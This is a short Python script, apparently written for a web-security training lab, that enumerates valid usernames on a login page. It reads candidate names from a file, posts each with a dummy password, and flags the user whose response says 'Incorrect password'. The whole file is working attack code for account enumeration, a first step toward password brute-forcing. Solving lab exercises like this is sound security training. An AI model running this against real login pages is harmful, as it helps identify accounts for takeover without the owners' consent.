import requests

def main():
    url = "https://ace71fed1f0f7ac8c054122c005300c8.web-security-academy.net/login"

    with requests.Session() as s:
        users = open('users.txt', 'r')
        
        for i in range(101):
            user = users.readline().strip()
            data_user = {'username': user, 'password': 'dosindoasn'}
            r = requests.post(url, data=data_user)

            print("Trying with {}".format(user))

            if ("Incorrect password" in r.text):
                print("User: {}".format(user))
                break

if __name__=="__main__":
    main()